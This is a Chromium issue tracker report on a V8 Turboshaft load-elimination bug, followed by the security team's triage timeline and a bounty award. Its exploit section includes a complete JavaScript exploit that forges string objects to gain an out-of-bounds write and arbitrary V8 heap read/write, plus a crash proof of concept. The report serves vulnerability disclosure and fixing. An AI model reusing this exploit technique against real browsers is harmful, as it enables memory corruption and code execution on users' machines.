# Improper Error Handling in LateLoadElimination for String Map in Turboshaft Leads to RCE

| Field | Value |
|-------|-------|
| **Issue ID** | [403211343](https://issues.chromium.org/issues/403211343) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Turbofan |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | dm...@chromium.org |
| **Created** | 2025-03-13 |
| **Bounty** | $50,000.00 |

## Description

VULNERABILITY DETAILS

This is a long-standing vulnerability that, at first glance, seems not very harmful. However, through a very clever construction, it can be transformed into arbitrary read and write on the V8 Heap. It is indeed a simple process, and fortunately, it was successful.

## 1 Turboshaft Optimize

### 1.1 Building Graph

After the Turbofan optimization is completed and enters Turboshaft, you will get nodes similar to the following. Parts unrelated to triggering the vulnerability have been omitted.

```
3 Parameter    // str
4 Parameter    // size
...
11 Constant [Word32: 1]
...
// Check if str is an object of type ThinString
32 ObjectIs(3)    
33 DeoptimizeIf(32, 27)
...
// str[0]
36 Constant [Word32: 0]
39 Change(36)
40 StringAt(3, 39)    
...
// new Array(size)
44 ConvertJSPrimitiveToUntaggedOrDeopt(4, 27) 
49 Change(44)
50 NewArray(49)    
...
// str[1]
62 Change(11)
63 StringAt(3, 62)    

```

Note: Since `str[0]` generates a `32 ObjectIs(3)` node, `str[1]` will not regenerate this node.

### 1.2 Machine Lowering

In this phase:

- The result of `40 StringAt(3, 39)` is not used, so it will be optimized away.
- `ObjectIs(3)` generates a `Load` operation for loading the map field.
- `NewArray(49)` generates a memory allocation operation `Allocate`.
- `StringAt(3, 62)` will be optimized into a loop, which is too complex to detail here, so I have abbreviated it as `LOOP 24`, indicating that it is a loop.

```
3 Parameter    // str
4 Parameter    // size
...
11 Constant [Word32: 1]
...
// Check if str is an object of type ThinString
35 Load(3)            // load map field of str
36 TaggedBitcast(35)
37 Change(36)
38 Constant [0x425]
39 Comparison(37, 38)
41 DeoptimizeIf(39, 27)
 
...
// new Array(size)
...
113 Allocate(112) // Allocate a `FixedArray` object for the `elements` field of `arr`, which will allocate `size*4 + 8` bytes.

...
// str[1]
LOOP 24
....

```

The loop will parse the string object based on the map in a cycle, and if it encounters a situation it cannot handle, it will jump to `Runtime_StringCharCodeAt()`. The corresponding pseudocode is as follows.

```
function StringAt(str, idx) {
    while(1) {
        map = Load(str, +0x0);
        switch(map) {
            case SeqString:
                return str->chars[idx];
            case ExternalString:
                ... 
            case ConsString:
                if(str->second!="")
                    goto runtime;
                str = str->first;
            case SlicedString:
                idx+= str->offset;
                str = str->parent;
            case ThinString:
                str = str->actual;
        }
    }

runtime:
    Runtime_StringCharCodeAt();
}

```
### 1.3 Loop Peeling

In this phase, the loop corresponding to `StringAt(3, 62)` will be peeled off for one iteration, so the turboshaft graph is as follows.

```
3 Parameter    // str
4 Parameter    // size
...
11 Constant [Word32: 1]
...
// Check if str is an object of type ThinString
33 Load(3)            // load map field of str
34 TaggedBitcast(35)
35 Change(36)
36 Constant [0x425]
37 Comparison(37, 38)
38 DeoptimizeIf(39, 27)
 
...
// new Array(size)
...
94 Allocate(93) // Allocate a `FixedArray` object for the `elements` field of `arr`, which will allocate `size*4 + 8` bytes.

...
// str[1]
// This is one iteration extracted from the loop.
136 Load(3)     // load map field of str
137 TaggedBitcast(136)
138 Change(137)    // covert TaggedPointer to word32
139 Constant [0x155]
140 Comparsion(138, 139) // Determine the type of str
141 Branch(140)    // jump to the corresponding handler.
...

LOOP 35
....

```
### 1.4 Store Elimination

In the `StoreElimination` phase of the `LateLoadEliminationReducer`, this optimizer will use `33 Load(3)` to replace `136 Load(3)`.

Adding `--turboshaft-trace-load-elimination` allows you to see the replacement process.

```
> ProcessLoad(33)
> MemoryContentTable: will insert MemoryAddress{base=3, index=<invalid OpIndex>, offset=0, elem_size_log2=0, size=4} with value=33
...
> ProcessBlock(B25)
> ProcessLoad(136)
>> Found potential replacement at offset 33
>>> Confirming replacement

```

After replacement, the turboshaft graph is as follows, where `137 TaggedBitcast(33)` directly uses the result of the previous `33 Load(3)` instead of reloading the map field.

```
3 Parameter    // str
4 Parameter    // size
...
11 Constant [Word32: 1]
...
// Check if str is an object of type ThinString
33 Load(3)            // load map field of str
34 TaggedBitcast(35)
35 Change(36)
36 Constant [0x425]
37 Comparison(37, 38)
38 DeoptimizeIf(39, 27)
 
...
// new Array(size)
...
96 Allocate(95) // Allocate a `FixedArray` object for the `elements` field of `arr`, which will allocate `size*4 + 8` bytes.

...
// str[1]
// This is one iteration extracted from the loop.
137 TaggedBitcast(33) <<====
138 Change(137)    // covert TaggedPointer to word32
139 Constant [0x155]
140 Comparsion(138, 139) // Determine the type of str
141 Branch(140)    // jump to the corresponding handler.
...

LOOP 35
....

```
## 2 Root Cause

The replacement of the `136 Load(3)` node with `33 Load(3)` by the `LateLoadEliminationReducer` is incorrect.

This is because the node `96 Allocate(95)` following `33 Load(3)` might trigger a `Scavenge GC` due to insufficient Young Space memory.

`Scavenge GC` has a very specific operation: during migration, the `Scavenger::EvacuateThinString()` method updates the pointer in the `Slot` from the `ThinString` object to the `ThinString::actual()` object.

```
template <typename THeapObjectSlot>
SlotCallbackResult Scavenger::EvacuateThinString(Tagged<Map> map,
                                                 THeapObjectSlot slot,
                                                 Tagged<ThinString> object,
                                                 int object_size) {
  ...
  if (shortcut_strings_) {
    // The ThinString should die after Scavenge, so avoid writing the proper
    // forwarding pointer and instead just signal the actual object as forwarded
    // reference.
    Tagged<String> actual = object->actual();
    // ThinStrings always refer to internalized strings, which are always in old
    // space.
    DCHECK(!HeapLayout::InYoungGeneration(actual));
    UpdateHeapObjectReferenceSlot(slot, actual);
    return REMOVE_SLOT;
  }
  ...
}

```

Therefore, after `96 Allocate(95)` triggers `Scavenge GC`, `str` may change from a `ThinString` type to a `SeqString` type. Consequently, the map field of `str` needs to be reloaded, and the previous outdated result cannot be reused.

The root cause of this issue is that `LateLoadEliminationAnalyzer::ProcessAllocate()` does not recognize the side effects of `Allocate` nodes.

```
void LateLoadEliminationAnalyzer::ProcessAllocate(OpIndex op_idx,
                                                  const AllocateOp&) {
  TRACE("> ProcessAllocate(" << op_idx << ") ==> Fresh non-aliasing object");
  non_aliasing_objects_.Set(op_idx, true);
}

```

Thus, I believe this vulnerability was introduced when implementing the `low-level Load Elimination` feature, specifically in commit `32e2c6014d0daded58a1164ffc586e2e2890eb3a`.

## 3 How To Exploit

### 3.1 Only Allow Arbitrary Read?

The vulnerability occurs when `StringAt` loads a character and confuses a `SeqString` object for a `ThinString` type. This allows us to forge the `actual` pointer through the `chars[]` array in `SeqString`.

```
  SeqOneByteString        ThinString         ConsString
    +----------+         +----------+        +----------+
    |   map    |         |    map   |        | map=0x385|
    +----------+         +----------+        +----------+
    |raw_hash..|         |raw_hash..|        |raw_hash..|
    +----------+         +----------+        +----------+
    | length   |         |  length  |        |  length  |
    +----------+         +----------+        +----------+
    | chars[]  |         |  actual  |        |  first   |
    +----------+         +----------+        +----------+
                                             | second   |
                                             +----------+

```

At this point, we cannot leak an address, but this issue can be resolved using the fixed address feature of the large space:

- Allocate a floating-point array in the large space, with a known address, referred to as `FIXED_BUFFER_ADDR`. We can use this to forge any `String` object.
- Set the first 4 bytes of `SeqString::chars[]` to the `FIXED_BUFFER_ADDR` pointer, which will subsequently be treated as the `ThinString::actual` field.

Thus, this vulnerability gives us the ability to forge any `String` object and then call `StringAt` to read a byte from it.

```
function StringAt(str, idx) {
    while(1) {
        map = Load(str, +0x0);
        switch(map) {
            case SeqString:
                return str->chars[idx];
            case ExternalString:
                ... 
            case ConsString:
                if(str->second!="")
                    goto runtime;
                str = str->first;
            case SlicedString:
                idx+= str->offset;
                str = str->parent;
            case ThinString:
                str = str->actual;
        }
    }

runtime:
    Runtime_StringCharCodeAt();
}

```

At first glance, this appears to be a very weak primitive, capable of only limited arbitrary reads. However, upon further investigation, it was found that this vulnerability can be transformed into arbitrary read/write on the V8 heap.

### 3.2 Using Flatten to Achieve OOB Write

Now, onto the most interesting part: when `StringAt()` processes a `ConsString`, if the `ConsString::second` field points to a non-empty string, it will be handled by `Runtime_StringCharCodeAt()`.

`Runtime_StringCharCodeAt()` first calls `String::Flatten(isolate, subject);` to flatten the string.

```
RUNTIME_FUNCTION(Runtime_StringCharCodeAt) {
  SaveAndClearThreadInWasmFlag non_wasm_scope(isolate);
  HandleScope handle_scope(isolate);
  DCHECK_EQ(2, args.length());

  DirectHandle<String> subject = args.at<String>(0);
  uint32_t i = NumberToUint32(args[1]);

  // Flatten the string.  If someone wants to get a char at an index
  // in a cons string, it is likely that more indices will be
  // accessed.
  subject = String::Flatten(isolate, subject);
  ...
}

```

If both the `first` and `second` fields of the `ConsString` point to non-empty strings, it will enter `SlowFlatten()` for processing.

```
HandleType<String> String::Flatten(Isolate* isolate, HandleType<T> string,
                                   AllocationType allocation) {
  DisallowGarbageCollection no_gc;  // Unhandlified code.
  Tagged<String> s = *string;
  StringShape shape(s);

  // Shortcut already-flat strings.
  if (V8_LIKELY(shape.IsDirect())) return string;

  if (shape.IsCons()) {
    Tagged<ConsString> cons = Cast<ConsString>(s);
    if (!cons->IsFlat()) {    // cons->sencod->length!=0
      AllowGarbageCollection yes_gc; 
      HandleType<String> result =
          SlowFlatten(isolate, Cast<ConsString>(string), allocation); 
      return result;
    }
    s = cons->first();
    shape = StringShape(s);
  }
  ...
}

```

`String::SlowFlatten()`

- First, it retrieves the `ConsString::length` field: `length = raw_cons->length()`.
- Then, it creates a `SeqOneByteString` object `flat` that can hold `length` characters.
- Finally, it calls the `WriteToFlat2()` method to copy all characters from `raw_cons` into the `flat->chars` array.

```
V8_EXPORT_PRIVATE HandleType<String> String::SlowFlatten(
    Isolate* isolate, HandleType<ConsString> cons, AllocationType allocation) {

  bool is_one_byte_representation;
  uint32_t length;

  {
    DisallowGarbageCollection no_gc;
    Tagged<ConsString> raw_cons = *cons;
    ...
    length = raw_cons->length();
    is_one_byte_representation = cons->IsOneByteRepresentation();
  }

  HandleType<SeqString> result;
  if (is_one_byte_representation) {
    // Create a `SeqOneByteString` object with a length of `length` bytes, allocating it in the old space.
    HandleType<SeqOneByteString> flat =
        isolate->factory()
            ->NewRawOneByteString(length, allocation)
            .ToHandleChecked();
    ...

    // Copy the characters from the `ConsString` into `flat`.
    DisallowGarbageCollection no_gc;
    Tagged<ConsString> raw_cons = *cons;
    WriteToFlat2(flat->GetChars(no_gc), raw_cons, 0, length,
                 SharedStringAccessGuardIfNeeded::NotNeeded(), no_gc);
    raw_cons->set_first(*flat);
    raw_cons->set_second(ReadOnlyRoots(isolate).empty_string());
    result = flat;
  } else {
    ...
  }
  return result;
}

```

For simplicity, let's consider the case where both `raw_cons->first` and `raw_cons->second` point to `SeqString` objects.

`WriteToFlat2()` calls `WriteToFlat2Impl()` to write into `flat->chars` from back to front.

```
template <typename SinkCharT>
void String::WriteToFlat2(
    SinkCharT* dst,     // flat->chars
    Tagged<ConsString> src,    // raw_cons
    uint32_t src_index,     // 0
    uint32_t length,    // raw_cons->length
    const SharedStringAccessGuardIfNeeded& aguard,
    const DisallowGarbageCollection& no_gc) {
  ...

  SinkCharT* rdst = dst + length;  // Reverse cursor.
  wtf_stack_t stack{src->first()};
  wtf_stack_top_t top = src->second();
  WriteToFlat_RepeatOptimizer<SinkCharT> ropt;

  WriteToFlat2Impl<kWTFSeqOneByte>(rdst, top, stack, ropt, aguard, no_gc);
  WriteToFlat2Impl<kWTFGeneric>(rdst, top, stack, ropt, aguard, no_gc);
}

```

`WriteToFlat2Impl()` determines the length to write into `rdst` based on `s->length()`.

```
template <WriteToFlatImplVariant kVariant, typename SinkCharT>
V8_INLINE void WriteToFlat2Impl(SinkCharT*& rdst, wtf_stack_top_t& top,
                                wtf_stack_t& stack,
                                WriteToFlat_RepeatOptimizer<SinkCharT>& ropt,
                                const SharedStringAccessGuardIfNeeded& aguard,
                                const DisallowGarbageCollection& no_gc) {
  Tagged<String> s;
  while (V8_LIKELY(wtf_try_pop(top, stack, &s))) {
    ...

    if constexpr (kVariant == kWTFSeqOneByte) {
      ...
      // s is an object of the SeqOneByteString type
      uint8_t* chars = Cast<SeqOneByteString>(s)->GetChars(no_gc, aguard);
      uint32_t length = s->length();
      rdst -= length;
      CopyChars(rdst, chars, length);
    } else {
      ...
    }
  }
}

```

Note: `rdst` points to the end of the `flat->chars` array.

- When allocating memory, the size of `flat->chars` is determined by `raw_cons->length`.
- However, when writing to `flat->chars` in `WriteToFlat2Impl()`, the length written is determined by `raw_cons->first->length` and `raw_cons->second->length`.

Under normal circumstances, the `ConsString` object `raw_cons` satisfies: `raw_cons->length = raw_cons->first->length + raw_cons->second->length`. Therefore, there is no issue.

But now, with the ability to forge arbitrary `String` objects, we just need to ensure `raw_cons->length < raw_cons->first->length + raw_cons->second->length` to achieve an out-of-bounds write.

### 3.3 From OOB Write to Arbitrary Read and Write

Exploitation Strategy

1. First, forge a `ConsString` object with a `length` of `0x10`, where `ConsString->second` is a `SeqString` object with a `length` of `0x1C`.
2. `SlowFlatten()` will first allocate a `SeqString` object in the old space that can hold `ConsString->length` characters as `flat`.
3. It will then start copying from the end of `flat->chars`, beginning with `ConsString->second`. Since `ConsString->second->length == ConsString->length + 0xC`, this will exhaust `flat->chars` and overflow into the first three fields of `flat`.
4. It will then continue copying `ConsString->first`, which will overflow into the object before `flat`.

The illustration is as follows:

```
1. Just allocate SeqString as flat.:

                  flat:            | <--- cons->length ----> |
   -----------------+----------------------------------------+
     other obj      |map |hash|len |   chars[]               |
   -----------------+----------------------------------------+
                                           Copy Direction    ^
                                                 <=====      |
                                                           rdst

2. After WriteToFlat2Impl() copies cons->second:

                  flat:            | <--- cons->length ----> |
   -----------------+----------------------------------------+
     other obj      |map |hash|len |   chars[]               |
   -----------------+----------------------------------------+
                    ^                                        ^
                    |   <-- cons->second->length   -->       |
                   rdst


3. After WriteToFlat2Impl() copies cons->first, overflow to the object in front of flat.

                  flat:            | <--- cons->length ----> |
   -----------------+----------------------------------------+
     other obj      |map |hash|len |   chars[]               |
   -----------------+----------------------------------------+
  ^                 ^                                        ^
  |cons->first->len |   <-- cons->second->length   -->       |
 rdst                

```

Thus, we gain the ability to overwrite objects in the Old Space from the back to the front. Here, I choose to directly overwrite the `length` field of a `JSArray` object. The memory layout is as follows:

```
           -------- +---------------+ <---+
  FixedDoubleArray: |    map        |     |
                    +---------------+     |
                    |    properties |     |
                    +---------------+     |
                    |   elements    |     |
                    |   length      |     |
            ------- +---------------+     |
        JSArray:    |    map        |     |
                    +---------------+     |
                    |    properties |     |
                    +---------------+     |
                    |   elements    |-----+
                    +---------------+
                    |   length      |    <== Target
            ------- +---------------+
       SeqString    |    map        |
                    +---------------+
                    | raw_hash_field|
                    +---------------+
                    |    length     |    ^^
                    +---------------+    || Overflow Direction
                    |   chars[]     |    ||
                    |               |
                    +---------------+  

```

This memory layout has the following advantages:

1. The values from `chars[]` to the `JSArray::length` field are all predictable. According to `StaticReadOnlyRoot`, `SeqString::map` is fixed at `0xb5`, so there's no need to leak an address.
2. By overwriting `JSArray::length` with a particularly large value, we can achieve arbitrary address read and write on the `V8 Heap`.

This is a completely new exploitation method. Achieving arbitrary address read and write through the `StringAt` operation is truly astonishing.

## 4 My Exp

exp.js:

```
const f64 = new Float64Array(0x20);   
const bigUint64 = new BigUint64Array(f64.buffer); 
const u32 = new Uint32Array(f64.buffer);

function intTo4ByteString(int) {
    let res = "";
    for(let i=0; i<4; i++) {
        res += String.fromCharCode(int&0xFF);
        int>>=8;
    }
    return res;
}

// The elements backing storage of large_array are allocated in large space with a fixed address.
const large_array = new Array(0x40000);
large_array.fill(1.1);
const FIXED_BUFFER_ADDR = 0x00540018;
const FIXED_BUFFER_STR = intTo4ByteString(FIXED_BUFFER_ADDR + 1);

// Forge an object in large_array
// First, forge a ConsString object: consStr->length < consStr->first->length + consStr->second->length
u32[0] = 0x385;                         // +0x0: map, kConsOneByteStringMap
u32[1] = 0x0;                           // +0x4: raw_hash_field
u32[2] = 0x10;                          // +0x8: length
u32[3] = FIXED_BUFFER_ADDR + 0x50 + 1;  // +0xc: first, first will be copied after second
u32[4] = FIXED_BUFFER_ADDR + 0x20 + 1;  // +0x10: second, second will be copied first
large_array[0] = f64[0];                // <= FIXED_BUFFER_ADDR + 0x0
large_array[1] = f64[1];
large_array[2] = f64[2];

/* 
   Forge a SeqString1 containing 0x10 + 0xc bytes as the second of consString
   - The last 0x10 bytes are used for padding to exhaust flat->chars, which can only hold consString->length characters.
   - The first 0xC bytes will overflow to the head of flat, i.e., the map, raw_hash_field, and length fields,
     ensuring these fields remain valid to prevent a crash.
*/
u32[0] = 0xb5;          // +0x0: map, kSeqOneByteStringMap
u32[1] = 0x0;           // +0x4: raw_hash_field
u32[2] = 0x1C;          // +0x8: length
u32[3] = 0xb5;          // +0xc: chars, flat->map
u32[4] = 0xff;          //          flat->raw_hash_field
u32[5] = 0x10;          //          flat->length
u32[6] = 0x45454545;    // padding
u32[7] = 0x45454545;
u32[8] = 0x45454545;
u32[9] = 0x45454545;
large_array[4]  = f64[0];   // <= FIXED_BUFFER_ADDR+0x20
large_array[5]  = f64[1];
large_array[6]  = f64[2];
large_array[7]  = f64[3];
large_array[8]  = f64[4];
/*
    Forge a SeqString2, so that each time SeqString2->chars[] is copied, it will overflow to the object in front of flat.
*/
u32[0] = 0xb5;          // +0x0: map, kSeqOneByteStringMap
u32[1] = 0x0;           // +0x4: raw_hash_field
u32[2] = 0x4;           // +0x8: length
u32[3] = 0x100000;      // +0xc: chars[], will overflow to the object in front of flat, which is the length field of the JSArray object corresponding to target_double_arr
large_array[10] = f64[0];   // <= FIXED_BUFFER_ADDR+0x50
large_array[11] = f64[1];
large_array[12] = f64[2];

// Make the JSArray object of target_double_arr the last object in the old space.
// This way, when SlowFlatten() allocates a SeqString object for flat, the JSArray is just in front of the SeqString, facilitating overflow.
const gc_args = {type: "major"};
const target_double_arr = [2.2, 2.2, 2.2, 2.2, 2.2, 2.2, 2.2, 2.2, 2.2, 2.2, 2.2, 2.2, 2.2, 2.2, 2.2, 2.2];
gc(gc_args);

function opt_me(str, size) {
    // Although the result of str[0] is not used, Turboshaft will generate an `ObjectIs` Op to check if str is a ThinString.
    // Subsequently, in turboshaft MachineLowering, ObjectIs will generate a `Load(str, +0x0)` Op to load the map field.
    str[0];

    // Allocate a array, generating an `AllocateOp`, which will trigger GC when the young space is exhausted.
    const arr = new Array(size);
    // Use arr to prevent it from being optimized away.
    arr[0];

    // Turboshaft will generate a `StringAt` Op.
    // Turboshaft MachineLowering will optimize StringAt into lower-level nodes, which requires generating a `Load(str, +0x0)` node to load the map field.
    // Turboshaft LateLoadElimination will directly reuse the Load(str, +0x0) generated by the previous `str[0]`.
    // However, in reality: when Allocate triggers GC, the ThinString is migrated to SeqString.
    // The implicit class of `str` has changed, and it needs to be reloaded, so the outdated result cannot be reused, leading to a vulnerability.
    return str[1];  // Note: The result of str[1] must be used, otherwise it will be optimized away.
}

// Generate an object of type SeqString.
// Note: str must be dynamically generated, because compile-time constant strings will be directly internalized.
const str = FIXED_BUFFER_STR + "A";   // When the vulnerability is triggered, FIXED_BUFFER_STR is treated as a pointer.

// Used as an array index to trigger string internalization.
// str is converted into a ThinString type object, pointing to the internalized string.
const arr = ["a"];
arr[str];

// Optimize opt_me with turbofan.
%PrepareFunctionForOptimization(opt_me);
opt_me(str, 100);
opt_me(str, 100);
%OptimizeFunctionOnNextCall(opt_me);
opt_me(str, 100);

// Continuously execute opt_me, new Array(size) will always exhaust memory, triggering Scavenge.
// Scavenger::EvacuateThinString() will change str from a ThinString to a SeqString type object.
for(let i=0; i<1000; i++) {
    print(i);
    print("try trigge");
    if(opt_me(str, 0x3000)=='E')
        break;
}

print("vuln trigger success");
print("target_double_arr.length: ");
print(target_double_arr.length);
print("WoW, we can AAW and AAR V8 Heap now");

```

By running the following, you can see that `target_double_arr.length` becomes a very large value.

```
./d8 \
    --expose-gc \
    --allow-natives-syntax \
    --turboshaft-loop-peeling \
    ./exp.js

```

The `FIXED_BUFFER_ADDR` varies with different V8 compilations, so you might need to adjust the heap feng shui. Other than that, this exploit is quite stable.

`exp.js` and `poc.js` have been tested on V8 with the commit `3cda165896d30d7a471f754962af7b8016966531`.

REPRODUCTION CASE

poc.js:

```
function opt_me(str, size) {
    // Although the result of str[0] is not used, Turboshaft will generate an `ObjectIs` Op to check if str is a ThinString.
    // Subsequently, in turboshaft MachineLowering, ObjectIs will generate a `Load(str, +0x0)` Op to load the map field.
    str[0];

    // Allocate a array, generating an `AllocateOp`, which will trigger GC when the young space is exhausted.
    const arr = new Array(size);
    // Use arr to prevent it from being optimized away.
    arr[0];

    // Turboshaft will generate a `StringAt` Op.
    // Turboshaft MachineLowering will optimize StringAt into lower-level nodes, which requires generating a `Load(str, +0x0)` node to load the map field.
    // Turboshaft LateLoadElimination will directly reuse the Load(str, +0x0) generated by the previous `str[0]`.
    // However, in reality: when Allocate triggers GC, the ThinString is migrated to SeqString.
    // The implicit class of `str` has changed, and it needs to be reloaded, so the outdated result cannot be reused, leading to a vulnerability.
    return str[1];  // Note: The result of str[1] must be used, otherwise it will be optimized away.
}

// Generate an object of type SeqString.
// Note: str must be dynamically generated, because compile-time constant strings will be directly internalized.
const str = "AAAA" + 1;   // When the vulnerability is triggered, "AAAA" is treated as a pointer.

// Used as an array index to trigger string internalization.
// str is converted into a ThinString type object, pointing to the internalized string.
const arr = ["a"];
arr[str];

// Optimize opt_me with turbofan.
%PrepareFunctionForOptimization(opt_me);
opt_me(str, 100);
opt_me(str, 100);
%OptimizeFunctionOnNextCall(opt_me);
opt_me(str, 100);

// Continuously execute opt_me, new Array(size) will always exhaust memory, triggering Scavenge.
// Scavenger::EvacuateThinString() will change str from a ThinString to a SeqString type object.
while (1) {
    print("try trigger Scavenge");
    opt_me(str, 0x3000);
}

```

run with debug compiled v8:

- The `--no-turboshaft-loop-unrolling` option is not necessary, but adding this parameter makes the turboshaft optimization process easier to analyze.
- The `--turboshaft-loop-peeling` parameter is necessary.

```
./d8 \
    --expose-gc \
    --omit-quit \
    --allow-natives-syntax \
    --no-turboshaft-loop-unrolling \
    --turboshaft-loop-peeling \
    ./poc.js

```

v8 will crash like that:

```
Received signal 11 SEGV_ACCERR 08e641414140
Segmentation fault

```

CREDIT INFORMATION

Reporter credit: [303f06e3]

## Timeline

### cl...@appspot.gserviceaccount.com (2025-03-13)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4555813741854720.

### 24...@project.gserviceaccount.com (2025-03-13)

ClusterFuzz testcase 4555813741854720 appears to be flaky, updating reproducibility hotlist.

### 24...@project.gserviceaccount.com (2025-03-13)

Detailed Report: https://clusterfuzz.com/testcase?key=4555813741854720

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7e9141414140
Crash State:
  Builtins_StringSubstring
  Builtins_ConstructProxy
  Builtins_ConstructProxy
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&revision=99247

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4555813741854720

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### ke...@chromium.org (2025-03-13)

Thank you for another very detailed report.

Assigning to sroettger@ for v8 triage.

### ch...@google.com (2025-03-14)

Setting milestone because of s2 severity.

### sr...@google.com (2025-03-14)

nicohartmann@ could you take a look since dmercadier@ is OOO this week? Thanks!

### dm...@chromium.org (2025-03-17)

Thanks for the report.

I considered this a while ago, but concluded that the only place of Turboshaft where specific String maps matter is indeed StringAt (ie, in all other places, we just care about "is this a string or not"). And because it's lowered to a loop that contains a runtime call, load elimination will not allow to eliminate the map load, so it should be safe.
Well, as you found out, except if the loop is peeled. Fortunately, loop peeling is disabled by default, and we have no intention to ever enable it, since it should be done in the frontend (currently, it's done by Turbofan; later it will be done by Maglev when we switch to Turbolev). So, impact is none.

I'll remove the loop peeling phase from Turboshaft altogether (I added it long ago when it wasn't clear whether we'd end up doing something with it; the answer is a clear "no" today).

Still, LateLoadElimination should probably clear string maps on allocations, but it's hard in general to figure out if a random Load at offset 0 is loading a string map or not. I'll think about it.

### dm...@chromium.org (2025-03-17)

CCing jkummerow@ and mliedtke@: Wasm could suffer from the same issue, given that it uses more or less the same load elimination, and also has a similar mechanism for ChatAt. However, loop peeling runs before WasmLoweringPhase, so I think that this is fine.

### sr...@google.com (2025-03-17)

marking as impact-none since this needs the --turboshaft-loop-peeling flag, which is disabled by default, and we have no plan on enabling it

### sp...@google.com (2025-04-18)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $50000.00 for this report.

Rationale for this decision:
high-quality report demonstrating controlled write in a sandboxed process / the renderer


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2025-07-11)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> high-quality report demonstrating controlled write in a sandboxed process / the renderer

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/403211343)*
